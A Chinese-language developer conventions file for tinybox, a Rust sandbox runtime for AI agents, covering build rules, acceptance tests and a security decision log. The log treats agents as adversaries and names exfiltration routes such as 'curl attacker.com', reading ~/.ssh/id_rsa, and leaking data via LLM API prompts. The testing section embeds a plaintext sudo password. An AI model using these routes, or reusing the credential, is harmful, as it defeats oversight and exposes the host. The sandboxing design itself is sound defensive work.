# tinybox 开发约定

> **先读 [docs/PLAN.md](docs/PLAN.md)。** 它是当前代码库的权威逐行审计
> （P0–P3 问题 + 修复路线图）。docs/PLAN.md 里的各 phase 状态优先于旧
> 文档里的"✅"：若干 phase 有开放 P0/P1 项，在 docs/PLAN.md 对应里程碑
> 打 tag 之前不得视为完成。

## 项目概览

tinybox 是一个从零用 Rust 实现的 Linux 沙箱运行时，类似 `runc` 但简化、
聚焦 Agent 工作负载。它分 8 个 phase 增量构建，每个 phase 产出一个可跑、
可验的交付物。

> **⚠️ 安全状态（2026-08-16，M1 之后）：P0 隔离漏洞已修，硬化未完。**
> 里程碑 M1 关闭了全部四个 P0 项：bridge/veth/NAT 路径被删（Option A），
> 沙箱现在始终 unshare `CLONE_NEWNET`，`clone` 经 seccomp flag 屏蔽禁止
> `CLONE_NEW*`，capability bounding set 已清空。`tinybox run` 路径现在
> 是一道可辩护的隔离屏障。剩余开放项（P1 OCI 字段 honoring、
> P2 `/dev`/`/tmp`/`/sys` 硬化、rootful）是正确性/纵深问题，非逃逸洞。
> 见 [docs/PLAN.md](docs/PLAN.md)。

## 约定

### 语言与风格
- **Rust edition**：2021
- **格式化**：`rustfmt` 默认设置
- **Lint**：`clippy`，不允许任何 warning
- **命名**：函数/变量 snake_case，类型 CamelCase，常量 SCREAMING_SNAKE_CASE
- **错误处理**：CLI/API 代码用 `anyhow::Result`，库代码用自定义错误类型
- **Unsafe**：尽量少用 `unsafe`。仅用于 FFI 或直接 syscall 包装。在
  `// SAFETY:` 注释里写清安全不变量

### 依赖
优先最小依赖。批准的 crate：
- `clap`（CLI 解析）
- `serde` / `serde_json` / `serde_yaml`（配置序列化）
- `axum`（HTTP API）
- `nix`（Linux syscall 包装，用于 namespaces、pivot_root 等）
- `anyhow` / `thiserror`（错误处理）
- `tokio`（daemon 模式的异步 runtime）
- `tracing` / `tracing-subscriber`（日志）
- `libc`（仅在 nix 不覆盖时做裸 FFI）
- `seccompiler`（seccomp BPF filter 生成——Phase 5 用）
- `tar` / `flate2`（镜像 tar 解包——Phase 9/10 用）
- `reqwest`（Docker registry HTTP——Phase 10 用；blocking feature）
- `aya` 或 `libbpf-rs`（eBPF——**仅研究轨 R0 用**，尚未引入）
  （fanotify 与 Landlock 走 `libc` syscall，不需 crate）

无明确理由不要加依赖。避免完整容器运行时、虚拟化库、或 OCI SDK。

### Linux 专属代码
- 所有 Linux 专属代码用 `cfg!(target_os = "linux")` 守卫
- 非 Linux 平台用清晰消息 panic
- 仅 cgroup v2（不支持 v1）
- 假设 kernel 5.10+（Ubuntu 20.04 LTS 基线）

### 测试
- **单元测试**：`#[cfg(test)] mod tests { ... }` 紧跟各模块
- **集成测试**：`tests/` 目录，每 phase 一个文件
- **验收测试**：`scripts/` 下的 shell 脚本，验证各 phase 验收标准
- 跑测试：`cargo test && cargo clippy -- -D warnings`
- 跑验收测试：`SUDO_ASKPASS=.sudo-askpass.sh sudo -A ./scripts/test_phaseN.sh`
- **Sudo 设置**：`.sudo-askpass.sh` 脚本为自动化测试提供 sudo 密码
  （密码：kdy）
- **WSL2 修复**：若 `sudo` 报 "unable to allocate pty"，跑：
  `sudo mount -t devpts devpts /dev/pts`

### Git 工作流
- 每个 phase 完成一次提交
- 提交信息格式：`<type>: <做了什么>`，简练一两句。**不带 phase / 开发
  阶段表述**，只写实际做了什么。`type` 用 `fix:`/`docs:`/`feat:`/
  `refactor:` 等常规前缀。
- 每个 phase 完成打 tag：`git tag v0.N`

## Phase 依赖

每个 phase 依赖前一个。不要跳级。Phase 序列：

```
1 (skeleton) → 2 (namespaces) → 3 (overlayfs) → 4 (cgroups)
                                                        ↓
                                          5 (seccomp) → 6 (OCI) → 7 (network) → 8 (API)
```

- Phase 5 与 6 可互换（seccomp 在 OCI 前或后）
- Phase 7（network）可与 Phase 6（OCI）并行（若偏好）
- Phase 8 是收尾，依赖之前所有 phase

## 验收

每个 phase 有明确验收标准。标 phase 完成前手动验：

### Phase 1
```bash
tinybox run -- echo hello          # → "hello"
tinybox run -- sh -c "exit 42"    # → exit code 42
```

### Phase 2
```bash
tinybox run -- ps aux              # → only 2-3 processes
tinybox run -- id                  # → uid=0(root)
tinybox run --hostname sbox1 -- hostname  # → "sbox1"
```

### Phase 3
```bash
# Prepare rootfs first
tinybox run --root /tmp/alpine-rootfs -- ls /  # → alpine fs
tinybox run --root /tmp/alpine-rootfs -- sh -c "echo hi > /t && cat /t"  # → "hi", host file doesn't exist
```

### Phase 4
```bash
tinybox run --memory 64m -- sh -c "dd if=/dev/zero of=/dev/null bs=1M count=200"  # → OOM killed
```
> 注意：flag 是 `--memory`/`-m`（不是 `--mem-limit`），后缀大小写敏感
> 且为小写（`64m`，不是 `64M`）。

### Phase 5
```bash
tinybox run -- reboot              # → SIGSYS
tinybox run -- mount -t tmpfs none /tmp  # → fails
tinybox run --dangerous -- mount -t tmpfs none /tmp  # → succeeds
```

### Phase 6
```bash
# Build OCI bundle
mkdir -p /tmp/oci-bundle/rootfs
cp -a /tmp/alpine-rootfs/. /tmp/oci-bundle/rootfs/
cat > /tmp/oci-bundle/config.json <<'EOF'
{"process":{"args":["/bin/sh","-c","echo hello-oci"],"env":["PATH=/usr/bin"]},"root":{"path":"rootfs","readonly":true},"linux":{"namespaces":[{"type":"pid"},{"type":"mount"}]}}
EOF
tinybox run --oci /tmp/oci-bundle   # → "hello-oci"
```
> ⚠️ **P1-1（开放）：** `linux.namespaces`、`root.readonly`、`process.cwd`、
> `process.user` 字段当前被**静默忽略**。tinybox 无论 bundle config 如何
> 都建完整 namespace 集。验收测试能过只是因为它不断言 namespace *子集*。

### Phase 7
```bash
tinybox run -- ping 8.8.8.8         # → network unreachable
tinybox run --proxy http://127.0.0.1:8080 -- wget -q -O- http://example.com  # → succeeds
```
> ⚠️ **P0-1 / P0-2（已在 M1 解决，2026-08-16）：** bridge 路径被删
> （Option A），沙箱现在始终 unshare `CLONE_NEWNET`。`--proxy` 现在
> 提供真隔离：loopback-only netns + env vars。`scripts/test_phase7.sh`
> Test 3 断言 `--proxy` 模式无默认路由。

### Phase 8
```bash
tinybox daemon --listen 127.0.0.1:8080 &
curl -X POST http://127.0.0.1:8080/api/sandboxes -H "Content-Type: application/json" -d '{"rootfs":"/tmp/alpine-rootfs","mem_limit_mb":256,"command":["sleep","30"]}'  # → {"id":"sb-..."}
curl http://127.0.0.1:8080/metrics  # → Prometheus metrics
```

## 约束

### 不要做
- 不要实现完整 OCI runtime（不必处理全部 50+ config.json 字段；只实现
  核心 10 个）
- 不要加 GPU 支持（无 passthrough、无 CUDA）
- 不要实现镜像拉取（依赖 `docker export` 或既有 rootfs）
- 不要实现多节点编排（仅单机）
- 不要处理 SELinux 或 AppArmor（seccomp + capabilities 是 v1.0 LSM 故事；
  **Landlock 是研究轨显式追加**的 FS 能力维度——见
  [docs/VISION.md](docs/VISION.md) R1，非对本规则的否定）
- 不要实现用户态网络（无 TUN/TAP、无 bridge）
- 不要用 Docker、containerd、或 runc 库（本项目从零开始）
- 不要加 Windows/macOS 支持（仅 Linux）

> **代码树中的约束违例（2026-08-16）：已解决。** Phase 11
> （`src/network.rs`）实现了 bridge + veth + NAT 路径，违反上面的
> "no TUN/TAP, no bridge"规则并泄漏到宿主 netns（P0-1）。里程碑 M1
> （2026-08-16）取 Option A：`src/network.rs` 删除，
> `--network`/`-p`/`--publish` flags 移除，沙箱现在始终 unshare
> `CLONE_NEWNET`。约束与代码树现已一致。（研究轨的网络执行仍走
> proxy——见 [docs/VISION.md](docs/VISION.md)；eBPF 若在 R0 加入，是做
> 审计/观测，非 bridge 替代。）

### 优先级
- **正确性**：沙箱必须真隔离。进程泄漏到宿主是 bug。
- **安全**：默认 seccomp 策略必须防逃逸。`--dangerous` 是 opt-in。
- **可度量**：每个优化都要有基准数字支撑。
- **简洁**：**静态隔离骨架**约 2000 行 Rust（修复轨 M0–M4）。研究轨
> （[docs/VISION.md](docs/VISION.md) 的 R0–R3）单独核算，会超出此预算。
  优先可读代码，不要花哨抽象。

> **安全状态（2026-08-16，M1 之后）：** "默认 seccomp 策略必须防逃逸"
> 这条优先级**现已达成**——P0-3（白名单中的逃逸原语）与 P0-4（bounding
> set 从未清空）已修。`clone` flag 屏蔽、逃逸 syscall 移除、对所有 14 个
> 危险 cap 调 `PR_CAPBSET_DROP`。

## 决策日志

### 2026-08-02：项目立项
- **语言**：Rust（JD 要求："倾向 Rust / C / Python"）
- **隔离模型**：进程级（namespaces + cgroups + seccomp），非 VMM
- **Rootfs**：Overlayfs + COW，退出自动清理
- **网络**：基于 proxy 的隔离（沙箱无真实 NIC，所有流量走宿主 proxy）
- **OCI 兼容**：Phase 6，仅支持核心 config.json 字段，非完整规范
- **CLI 名**：`tinybox`（曾考虑：sandbox-rs、jail、sbox、cell）

### 2026-08-02：Phase 排序
- OCI 支持移到 Phase 6（核心隔离可用后、网络前）
- 理由：OCI config.json 包所有隔离特性，应在各自可用后加
- 网络放 Phase 7，因最复杂且可独立开发

### 2026-08-16：代码审查与修复计划
- **结果**：对全部 11 个源文件（~2004 LOC）做逐行审计，产出
  [docs/PLAN.md](docs/PLAN.md)，含 4 P0、5 P1、5 P2、6 P3 项。
- **网络设计矛盾**：Phase 11（`src/network.rs`）实现 bridge + veth + NAT
  路径，与 2026-08-02 "proxy-based, no bridge"决定及 "no TUN/TAP, no
  bridge"约束矛盾，且泄漏到宿主 netns（P0-1）。**待决**（里程碑 M1）：
  - **Option A（建议）**：删 `network.rs`；恢复 proxy-only 设计；
    `--proxy` 拿到真 `CLONE_NEWNET`（loopback-only）+ env vars。
  - **Option B**：保留 bridge，修顺序 bug，更新设计文档允许 bridge 作
    opt-in 功能。
- **OCI 深度**：Phase 6 只 honor `process.args`/`env` 与
  `root.path`——`linux.namespaces` 等被静默丢（P1-1）。本文件"核心 10
  字段"的说法是愿景性表述，非事实。
- **seccomp 逃逸原语**：`clone`（无限制）、`open_by_handle_at`、
  `process_vm_readv/writev`、`perf_event_open` 在白名单；bounding set 从未
  清空（P0-3、P0-4）。
- **文档策略**：README 与 AGENTS.md 现反映真实各 phase 状态
  （✅/⚠️/❌）并指向 docs/PLAN.md 为真相源。一个 phase "✅" 仅当它过
  验收且无开放 P0/P1 项。

### 2026-08-16：里程碑 M1——P0 隔离漏洞关闭
- **决策**：P0-1 取 **Option A**——`src/network.rs`（bridge + veth + NAT）
  整体删除；`--network`/`-p`/`--publish` flags 移除；
  `SandboxConfig.network`/`ports` 字段移除。理由：bridge 路径违反
  2026-08-02 "no bridge"决定与 "no TUN/TAP, no bridge"约束，且其顺序 bug
  把配置泄漏到宿主 netns。恢复 proxy-only 设计也去掉了 `ip`/`iptables`
  运行时依赖。
- **P0-2**：`child_main` 现在**始终**插入 `CLONE_NEWNET`（
  `proxy.is_none() && network.is_none()` 门控移除），故 `--proxy` 产出
  loopback-only netns + env vars 而非共享宿主 netns。
- **P0-3**：`clone` 现带 `SeccompCmpOp::MaskedEq(0x7E020000)` 规则于
  arg0，禁止任何 `CLONE_NEW*` bit（→ SIGSYS）；`clone3` 仍不在白名单。
  九个逃逸/干扰 syscall 移除（`open_by_handle_at`、
  `process_vm_readv/writev`、`perf_event_open`、`ioprio_set`、`mbind`、
  `set_mempolicy`、`migrate_pages`、`move_pages`）。`DANGEROUS_CAPS` 8→14
  （加 `CAP_DAC_READ_SEARCH`、`CAP_NET_RAW`、`CAP_AUDIT_WRITE`、
  `CAP_AUDIT_CONTROL`、`CAP_SETFCAP`、`CAP_SYSLOG`）。规则构建抽出为
  `build_rules()` 以便单测。
- **P0-4**：`drop_capabilities` 现遍历 `DANGEROUS_CAPS`，在 `capset` +
  ambient 清空后对每个调 `prctl(PR_CAPBSET_DROP, cap)`。
- **验证**：`scripts/test_phase5.sh` Tests 5–7（正常 fork ok、
  `clone(CLONE_NEWUSER)` → SIGSYS、`CapBnd` 已清）；`scripts/test_phase7.sh`
  Test 3（`--proxy` 无默认路由）；两个新 seccomp 单测；
  `tests/phase5.rs` cap 测试扩展为也断言 `CapBnd`。所有验收门绿；
  `cargo test`（58 测试）+ `cargo clippy -- -D warnings` 干净。

### 2026-08-16：愿景对齐
- **结果**：[docs/VISION.md](docs/VISION.md)（研究北极星，R0–R3）与
  [docs/PLAN.md](docs/PLAN.md)（修复轨，M0–M4）对齐。依赖规则记入两者：
  **R0 可与 M2 并行；R1 只在 M2 关闭后开始**。
- **重排优先级**：P2-1（`/dev`/`/tmp`/`/sys` 硬化）从 M3 提前到 M2——
  R0 的验收（沙箱化 `pip install` 产审计日志）需要能用的 `/dev`/`/tmp`，
  故 P2-1 是研究轨前置，非打磨项。
- **P1-2 解决**：`network.rs` 在 M1 删除后，`ip`/`iptables` 静默失败类
  不复存在；PLAN.md 标 RESOLVED。
- **浮现的开放设计问题**（尚未决——留给 R0/R1）：
  - seccomp filter 是**单调的**（只能叠加，不能移除）→ 双向动态 grant
    不能靠 seccomp；网络/FS/资源维度须承载动态层（eBPF map、
    fanotify/Landlock、cgroup resize）。`SECCOMP_RET_USER_NOTIF` 是唯一
    双向 syscall 路径，但有每次调用的 userspace 往返延迟。
  - proxy 仍是**网络执行层**（L7，易按 host allow/deny）；eBPF egress
    是**审计/观测层**，不做执行（保"no bridge"约束且避免脆的 TLS-SNI
    解析）。
  - Landlock 是 **FS 执行**候选原语（内核态、路径策略）；fanotify 是
    FS **审计**原语。
- **LOC 预算重框**：~2000 行目标现明确只算静态骨架（M0–M4）；研究轨
  （R0–R3）单独核算，会超出。

### 2026-08-16：能力授予链（用户授权）
- **决策**：能力描述符由**用户/编排器**在开任务时声明（"这任务不需要
  网络就完全不给网络"），runtime 内核态强制，**Agent 自身无权给自己
  授权**（它是对抗方，会撒谎骗权限）。这个预算既是安全边界，也是**防
  Agent 跑偏的任务契约**——任务范围超出声明的预算即被拒（如用户说"纯
  离线分析"，Agent 想去拉网既挡 exfil 也挡跑偏）。
- **授予链四角色**：
  - 部署方/平台：定义策略文档（CapabilityDescriptor），是策略源头。
  - Agent 编排器（如 open-code 框架）：发 phase marker，是阶段知情者。
  - 行为推断引擎：消费 R0 事件流，**交叉校验** marker 与实际行为一致
    （防编排器被 prompt injection 误导后撒谎骗权限）。
  - tinybox runtime：拿到"phase + 校验通过"后 grant/revoke，**内核态
    强制**，不可绕过。
- **R1 v1 阶段信号**用编排器显式 marker + 基础状态机交叉校验；纯行为
  推断的阶段识别留给 R6（真正的研究赌注）。详见
  [docs/VISION.md](docs/VISION.md) 第 3 节与第 6 节 R1。

### 2026-08-16：部署拓扑——模式 C 混合
- **决策**：tinybox 目标拓扑是**模式 C（混合）**——Agent runtime 留在
  host，高风险工具调用（bash/python/npm/compiler/git-clone 第三方）
  路由进 per-task 沙箱；低风险操作（read/edit workspace、LLM API 调用、
  reasoning/memory）在 host 执行。理由：契合 Coding Agent 实际工作模式
  与"高频短命"负载对 ms 级启动的要求。详见
  [docs/VISION.md](docs/VISION.md) §2.5。
- **关键约束**：模式 C 不是"低风险=host 不受限"。read 若在 host 且无
  FS 策略，Agent 可直接读 `~/.ssh/id_rsa` 外泄。故能力描述符必须在
  **两层**强制：in-host 层用 Landlock 给 Agent runtime 自身套 FS 策略
  （Landlock 因此从"R1 候选原语"升为**模式 C 必需组件**）；in-sandbox
  层用 seccomp + namespaces + cgroup。
- **诚实威胁边界**：执行沙箱挡"直接主机破坏 + 朴素外泄
  （`curl attacker.com`）"，**挡不住"经 LLM API prompt 外泄合法可读
  数据"**——该流量加密且若 LLM 调用在 host 则 sandbox 看不见。这层
  交给 FS 策略对可读路径保守 + 编排器 prompt 审计，不在 tinybox 执行
  沙箱职责内。RQ3 须如实标注此边界。
- **可重置作用域**：tinybox 的"reset/snapshot"只覆盖沙箱状态
  （rootfs overlayfs COW + cgroup + netns），不含 Agent 记忆/上下文
  （编排器职责）。

## 相关项目

- [mini-infer](https://github.com/Deyu-Kong/mini-infer)：C++/CUDA LLM 推理引擎从零实现（同"from scratch"哲学）
- [runc](https://github.com/opencontainers/runc)：参考 OCI runtime（tinybox 是其简化教学性重实现）
